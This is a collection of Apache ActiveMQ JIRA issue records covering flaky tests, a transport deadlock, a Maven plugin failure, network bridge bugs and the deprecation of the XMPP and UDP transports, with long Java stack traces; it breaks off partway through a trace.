We missed proton-api as dependency.
issueID:AMQ-4268
type:Bug
changed files:
texts:DurableSubscriptionOfflineTest has several failures
testRedeliveryFlag fails intermittently, and testOfflineSubscriptionWithSelectorAfterRestart fails regularlytestNoDuplicateOnConcurrentSendTranCommitAndActivate and testCleanupDeletedSubAfterRestart fail, but very rarely
issueID:AMQ-4270
type:Test
changed files:
texts:BrokerNetworkWithStuckMessagesTest hangs occasionally
The BrokerNetworkWithStuckMessagesTest hangs occasionally, which can cause the build to hang.
issueID:AMQ-4271
type:Improvement
changed files:
texts:<virtualSelectorCacheBrokerPlugin/> should be able to cache consumers with no selectors as well
With selectorAware=true setting for virtual topics we are checking for consumers (and their selectors) to detect if the message should be sent to the virtual topic or not. virtualSelectorCacheBrokerPlugin helps in the case we want to prevent "message loss" for subscribers that goes offline. But it doesn"t work for the consumers that don"t have selectors as they are not being cached. This should be sensible thing to do and allow both consumers with and without selectors to behave the same in this scenario.
issueID:AMQ-4272
type:Bug
changed files:SubscriptionView.java
queueConsumers.jsp
SubscriptionViewMBean.java
texts:No connection could be found for ID NC_
When I got to "Active Consumers" and click one of the connections on the network of brokers to other MQ machine I get this message. Is this a expected behaviour?Steps:1. Setup 2 or more instances with network of broker2. Open Admin -> Queue -> Active Consumer3. Locate NC_* connection and click on that
issueID:AMQ-4273
type:Test
changed files:
texts:JobSchedulerTest has 2 test cases that fail intermittently
The testRemoveLong and testAddCronAndByteSequence tests fail intermittently.
issueID:AMQ-4274
type:Bug
changed files:AbstractInactivityMonitor.java
texts:Potential deadlock between FailoverTransport and AbstractInactivityMonitor
Its possible for an operation that"s doing a send via oneway in FailoverTransport to deadlock with a Keep Alive write in the Inactivity Monitor.  Found one Java-level deadlock:============================="U.GeoCodingIncBuilder.1":  waiting for ownable synchronizer 0x00002aaac04e29e8, (a java.util.concurrent.locks.ReentrantLock$NonfairSync),  which is held by "ActiveMQ Session Task-42904""ActiveMQ Session Task-42904":  waiting for ownable synchronizer 0x00002ab3797e7348, (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync),  which is held by "ActiveMQ InactivityMonitor Worker""ActiveMQ InactivityMonitor Worker":  waiting to lock monitor 0x00002ab729f36a70 (object 0x00002aaac04f11d8, a java.lang.Object),  which is held by "ActiveMQ Session Task-42904"Java stack information for the threads listed above:==================================================="U.GeoCodingIncBuilder.1": at sun.misc.Unsafe.park(Native Method) - parking to wait for  <0x00002aaac04e29e8> (a java.util.concurrent.locks.ReentrantLock$NonfairSync) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:747) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:778) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1114) at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186) at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:66) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1290) at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1284) at org.apache.activemq.ActiveMQSession.<init>(ActiveMQSession.java:252) at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:332) at linqmap.ipc.impl.jms.SingleJmsFactory.createSession(SingleJmsFactory.java:492) at linqmap.ipc.impl.jms.SingleJmsFactory.createSendSession(SingleJmsFactory.java:318) at linqmap.ipc.impl.jms.JmsQueue.send(JmsQueue.java:117) at linqmap.ipc.queues.wrappers.AsyncSender$2.run(AsyncSender.java:81) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907) at java.lang.Thread.run(Thread.java:619)"ActiveMQ Session Task-42904": at sun.misc.Unsafe.park(Native Method) - parking to wait for  <0x00002ab3797e7348> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:747) at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireShared(AbstractQueuedSynchronizer.java:877) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireShared(AbstractQueuedSynchronizer.java:1197) at java.util.concurrent.locks.ReentrantReadWriteLock$ReadLock.lock(ReentrantReadWriteLock.java:594) at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:268) at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85) at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104) at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:640) - locked <0x00002aaac04f11d8> (a java.lang.Object) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1290) at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1284) at org.apache.activemq.ActiveMQSession.asyncSendPacket(ActiveMQSession.java:1898) at org.apache.activemq.ActiveMQSession.sendAck(ActiveMQSession.java:2064) at org.apache.activemq.ActiveMQSession.sendAck(ActiveMQSession.java:2059) at org.apache.activemq.ActiveMQMessageConsumer.acknowledge(ActiveMQMessageConsumer.java:1061) - locked <0x00002aaac06c7280> (a java.util.LinkedList) at org.apache.activemq.ActiveMQSession.acknowledge(ActiveMQSession.java:1604) at org.apache.activemq.ActiveMQMessageConsumer$1.execute(ActiveMQMessageConsumer.java:552) at org.apache.activemq.command.ActiveMQMessage.acknowledge(ActiveMQMessage.java:97) at linqmap.ipc.impl.jms.JmsQueue.onMessage(JmsQueue.java:262) at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1321) - locked <0x00002aaac06c0b70> (a java.lang.Object) at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131) at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907) at java.lang.Thread.run(Thread.java:619)"ActiveMQ InactivityMonitor Worker": at org.apache.activemq.transport.failover.FailoverTransport.handleTransportFailure(FailoverTransport.java:252) - waiting to lock <0x00002aaac04f11d8> (a java.lang.Object) at org.apache.activemq.transport.failover.FailoverTransport$3.onException(FailoverTransport.java:209) at org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:101) at org.apache.activemq.transport.WireFormatNegotiator.onException(WireFormatNegotiator.java:160) at org.apache.activemq.transport.AbstractInactivityMonitor.onException(AbstractInactivityMonitor.java:295) at org.apache.activemq.transport.AbstractInactivityMonitor$3.run(AbstractInactivityMonitor.java:168) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907) at java.lang.Thread.run(Thread.java:619)Found 1 deadlock.The deadlock occurs when the write check task detects a failure and calls the onException method while holding the write lock side of the RW lock in the monitor.  Since the FailoverTransport holds its reconnect lock for the duration of the oneway call and the onException method of failover transport tries to lock that same mutex things can lock if the oneway call was waiting on the read lock side of the monitors R/W lock. The solution is to ensure that we always unlock the writelock before we call the next transports onException method but after we"ve set the failed flag so that any waiting oneway calls will fail and throw their IOException indicating the transport has already failed.  This will free the failover transport up to do its normal failure recovery processing.
issueID:AMQ-4275
type:Bug
changed files:pom.xml
BrokerMojo.java
texts:maven plugin goal "activemq:run" cannot run in latest 5.8 snapshot
Running activemq:run gives this error:&#91;ERROR&#93; Failed to execute goal org.apache.activemq.tooling:activemq-maven-plugin:5.8-SNAPSHOT:run (default-cli) on project example: Unable to parse configuration of mojo org.apache.activemq.tooling:activemq-maven-plugin:5.8-SNAPSHOT:run for parameter project: Cannot configure instance of org.apache.maven.project.MavenProject from ${${project}} -> &#91;Help 1&#93;org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.apache.activemq.tooling:activemq-maven-plugin:5.8-SNAPSHOT:run (default-cli) on project example: Unable to parse configuration of mojo org.apache.activemq.tooling:activemq-maven-plugin:5.8-SNAPSHOT:run for parameter project: Cannot configure instance of org.apache.maven.project.MavenProject from ${${project}} at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:221) at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153) at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145) at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:84) at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:59) at org.apache.maven.lifecycle.internal.LifecycleStarter.singleThreadedBuild(LifecycleStarter.java:183) at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:161) at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:320) at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:156) at org.apache.maven.cli.MavenCli.execute(MavenCli.java:537) at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:196) at org.apache.maven.cli.MavenCli.main(MavenCli.java:141) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290) at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230) at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:409) at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:352)Caused by: org.apache.maven.plugin.PluginConfigurationException: Unable to parse configuration of mojo org.apache.activemq.tooling:activemq-maven-plugin:5.8-SNAPSHOT:run for parameter project: Cannot configure instance of org.apache.maven.project.MavenProject from ${${project}} at org.apache.maven.plugin.internal.DefaultMavenPluginManager.populatePluginFields(DefaultMavenPluginManager.java:597) at org.apache.maven.plugin.internal.DefaultMavenPluginManager.getConfiguredMojo(DefaultMavenPluginManager.java:529) at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:92) at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:209) ... 19 moreCaused by: org.codehaus.plexus.component.configurator.ComponentConfigurationException: Cannot configure instance of org.apache.maven.project.MavenProject from ${${project}} at org.codehaus.plexus.component.configurator.converters.composite.ComponentDefaultValueSetter.configure(ComponentDefaultValueSetter.java:84) at org.codehaus.plexus.component.configurator.converters.composite.ObjectWithFieldsConverter.fromConfiguration(ObjectWithFieldsConverter.java:103) at org.codehaus.plexus.component.configurator.converters.ComponentValueSetter.configure(ComponentValueSetter.java:348) at org.codehaus.plexus.component.configurator.converters.composite.ObjectWithFieldsConverter.processConfiguration(ObjectWithFieldsConverter.java:161) at org.codehaus.plexus.component.configurator.BasicComponentConfigurator.configureComponent(BasicComponentConfigurator.java:56) at org.apache.maven.plugin.internal.DefaultMavenPluginManager.populatePluginFields(DefaultMavenPluginManager.java:567) ... 22 more
issueID:AMQ-4276
type:Bug
changed files:NetworkBridgeFilter.java
texts:Don&#39;t restart the network bridge on race condition where respondent sends to a temp dest that has just been deleted
request reply with temp destinations can lead to forwarding exceptions in a network bridge, which tears down the bridge.because this can happen in normal operation; a respondent replying after an initiator has given up waiting for a reply, the bridge should be able to log and survive.Assume a network of brokers between three brokers: A <===> B <===> Ca client on C creates a temporary destination, assigns that as a reply-to in a message then sends the message.a client on A consumes the message and will send back a response to the temporary destination. after the response has been sent, the client on C goes away which will cause the temporary destination to go away. the advisory to remove the temporary destination will get to B before the response from the client on A gets to B. When the response finally does get to B, the temporary destination will no longer be there and will be considered invalid. It will throw a JMSException of Destination Does not Exist.
issueID:AMQ-4277
type:Bug
changed files:
texts:activemq-web - REST GET 204
Using 5.7 REST API I can GET a message from a topic but if a new message is POSTed to that same topic before the GET has been reissued (less than 20ms behind the POST and using the same session as the previous GET) the GET will timeout with a 204 and does not retrieve the message. This may be as designed for topics (queues are not an option) but I am just looking for confirmation. I assumed the first GET would have provided a topic subscription and the broker would hold a topic message for which there is a subscriber for longer than 20ms? This is not a stress test and is recreated with a simple producer and a separate consumer usually within the first couple of message exchanges. It has been noticed that when the topic message is POSTed without an outstanding GET to receive it, the following exception is logged: 2013-01-22 01:09:37,484 | DEBUG | Async client internal exception occurred with no exception listener registered: java.lang.IllegalStateException: DISPATCHED,initial | org.apache.activemq.ActiveMQConnection | ActiveMQ Session Task-1 java.lang.IllegalStateException: DISPATCHED,initial         at org.eclipse.jetty.server.AsyncContinuation.dispatch(AsyncContinuation.java:408)         at org.eclipse.jetty.server.AsyncContinuation.resume(AsyncContinuation.java:815)         at org.apache.activemq.web.MessageServlet$Listener.onMessageAvailable(MessageServlet.java:409)         at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1343)         at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131)         at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202)         at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)         at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)         at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)         at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)         at java.lang.Thread.run(Thread.java:722) Are there any configuration modifications available to have the topic messages retained for at least 1 second?
issueID:AMQ-4278
type:Bug
changed files:XmppTransport.java
XmppTransportServer.java
XmppTransportFactory.java
texts:deprecate xmpp transport
time to cut this transport loose, no real users in the wild
issueID:AMQ-4279
type:Improvement
changed files:UdpTransportFactory.java
ReliableTransport.java
UdpTransportServer.java
texts:deprecate udp transport
time to cut this transport loose, no real users in the wild. can remove in 5.9
issueID:AMQ-4281
type:Bug
changed files:
texts:ActiveMQConnectionFactoryTest fails intermittently
This depends on the order the tests are run in.  testConnectionFailsToConnectToVMBrokerThatIsNotRunning will fail if it is run after either testSetExceptionListener or testSetClientInternalExceptionListener.
issueID:AMQ-4282
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:Deadlock in test BrokerNetworkwithStuckMessageTest
Test is hanging on my Mac
issueID:AMQ-4283
type:Bug
changed files:
texts:conditionalNetworkBridgeFilterFactory ignores NetworkTTL
when the conditionalNetworkBridgeFilterFactory is configured via a policy entry, it bypasses the networkttl check in error. allowing messages to hop in error a cross linked/looped brokers.The networkTtl should only be ignored when replaying back to the origin.also, the rate limit should be applied in all cases.
issueID:AMQ-4285
type:Bug
changed files:
texts:NetworkFailoverTest failing
The test case NetworkFailoverTest is failing most times on my machine, will fail more often if the message count value is increased.
issueID:AMQ-4286
type:Bug
changed files:
texts:NioQueueSubscriptionTest.testLotsOfConcurrentConnections fails
This test fails consistently with multiple instances of the two first two exceptions shown below.  Out of 400 connections created, typically 40-140 fail.The last two exceptions occur randomly in the logs if I run with TRACE logging on.-------------------------------------------------------------------javax.jms.JMSException: Cannot send, channel has already failed: tcp://127.0.0.1:62621        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:62)        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1392)        at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1478)        at org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:516)        at org.apache.activemq.broker.NioQueueSubscriptionTest$1.run(NioQueueSubscriptionTest.java:90)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)        at java.lang.Thread.run(Thread.java:722)Caused by: org.apache.activemq.transport.InactivityIOException: Cannot send, channel has already failed: tcp://127.0.0.1:62621        at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:315)        at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:304)        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104)        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)        at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:81)        at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:86)        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1363)        ... 6 more-------------------------------------------------------------------OR javax.jms.JMSException: Could not connect to broker URL: tcp://localhost:62621?trace=false. Reason: java.net.SocketException: Connection reset by peer        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:35)        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:293)        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:238)        at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:184)        at org.apache.activemq.broker.NioQueueSubscriptionTest$1.run(NioQueueSubscriptionTest.java:88)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)        at java.lang.Thread.run(Thread.java:722)Caused by: java.net.SocketException: Connection reset by peer        at java.net.PlainSocketImpl.socketConnect(Native Method)        at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:339)        at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:200)        at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:182)        at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:391)        at java.net.Socket.connect(Socket.java:579)        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:496)        at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:459)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)        at org.apache.activemq.transport.AbstractInactivityMonitor.start(AbstractInactivityMonitor.java:140)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:273)        ... 6 more-------------------------------------------------------------------------java.net.SocketException: Invalid argument        at java.net.PlainSocketImpl.socketSetOption(Native Method)        at java.net.AbstractPlainSocketImpl.setOption(AbstractPlainSocketImpl.java:269)        at java.net.Socket.setReceiveBufferSize(Socket.java:1218)        at org.apache.activemq.transport.tcp.TcpTransport.initialiseSocket(TcpTransport.java:432)        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:513)        at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:459)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55)        at org.apache.activemq.transport.AbstractInactivityMonitor.start(AbstractInactivityMonitor.java:140)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:273)        at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:238)        at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:184)        at org.apache.activemq.broker.NioQueueSubscriptionTest$1.run(NioQueueSubscriptionTest.java:88)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)        at java.lang.Thread.run(Thread.java:722)-------------------------------------------------------------------2013-01-30 15:54:01,178 &#91;0.1:62621@62451&#93; - DEBUG ActiveMQConnection             - Async exception with no exception listener: java.net.SocketException: Connection resetjava.net.SocketException: Connection reset        at java.net.SocketInputStream.read(SocketInputStream.java:189)        at java.net.SocketInputStream.read(SocketInputStream.java:121)        at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:50)        at org.apache.activemq.transport.tcp.TcpTransport$2.fill(TcpTransport.java:604)        at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:58)        at org.apache.activemq.transport.tcp.TcpTransport$2.read(TcpTransport.java:589)        at java.io.DataInputStream.readInt(DataInputStream.java:387)        at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:275)        at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:221)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:213)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)        at java.lang.Thread.run(Thread.java:722)
issueID:AMQ-4288
type:Bug
changed files:
texts:OptimizedAckTest fails intermittently
Both the testVerySlowReceivedMessageStillInflight and testReceivedMessageNotInFlightAfterScheduledAckFires tests fail.
issueID:AMQ-4289
type:Bug
changed files:
texts:activemq-perf-maven-plugin is unusable because of bug in ReflectionUtil helper class
End up getting stack overflow for recursive call in ReflectionUtil.retrieveClassProperties()... if there is a getter that returns itself, it will not check that the "targetObject" which it"s inspecting is the same as what an identity getter would return. For example, RedeliveryPolicy has a method:getValue() {return this;}which causes this stack trace:java.lang.StackOverflowError at java.io.FileOutputStream.writeBytes(Native Method) at java.io.FileOutputStream.write(FileOutputStream.java:282) at java.io.BufferedOutputStream.flushBuffer(BufferedOutputStream.java:65) at java.io.BufferedOutputStream.flush(BufferedOutputStream.java:123) at java.io.PrintStream.flush(PrintStream.java:288) at com.intellij.rt.execution.junit.segments.SegmentedOutputStream.flush(SegmentedOutputStream.java:48) at com.intellij.rt.execution.junit.segments.SegmentedOutputStream.write(SegmentedOutputStream.java:44) at java.io.OutputStream.write(OutputStream.java:99) at java.io.PrintStream.write(PrintStream.java:430) at sun.nio.cs.StreamEncoder.writeBytes(StreamEncoder.java:202) at sun.nio.cs.StreamEncoder.implFlushBuffer(StreamEncoder.java:272) at sun.nio.cs.StreamEncoder.flushBuffer(StreamEncoder.java:85) at java.io.OutputStreamWriter.flushBuffer(OutputStreamWriter.java:168) at java.io.PrintStream.write(PrintStream.java:477) at java.io.PrintStream.print(PrintStream.java:619) at java.io.PrintStream.println(PrintStream.java:773) at java.lang.Throwable.printStackTrace(Throwable.java:461) at java.lang.Throwable.printStackTrace(Throwable.java:451) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:229) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUtil.java:218) at org.apache.activemq.tool.properties.ReflectionUtil.retrieveClassProperties(ReflectionUt
issueID:AMQ-4291
type:Bug
changed files:
texts:org.apache.activemq.transport.stomp.StompTest#testReplyToAcrossConnections mostly fails
seems the receive times out.java.net.SocketTimeoutException: Read timed out at java.net.SocketInputStream.socketRead0(Native Method) at java.net.SocketInputStream.read(SocketInputStream.java:129) at java.net.SocketInputStream.read(SocketInputStream.java:182) at java.io.DataInputStream.readByte(DataInputStream.java:248) at org.apache.activemq.transport.stomp.StompWireFormat.readHeaderLine(StompWireFormat.java:155) at org.apache.activemq.transport.stomp.StompWireFormat.readLine(StompWireFormat.java:148) at org.apache.activemq.transport.stomp.StompWireFormat.parseAction(StompWireFormat.java:181) at org.apache.activemq.transport.stomp.StompWireFormat.unmarshal(StompWireFormat.java:98) at org.apache.activemq.transport.stomp.StompConnection.receive(StompConnection.java:77) at org.apache.activemq.transport.stomp.StompConnection.receive(StompConnection.java:68) at org.apache.activemq.transport.stomp.StompTest.doReplyToAcrossConnections(StompTest.java:2107) at org.apache.activemq.transport.stomp.StompTest.testReplyToAcrossConnections(StompTest.java:2070) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:26) at 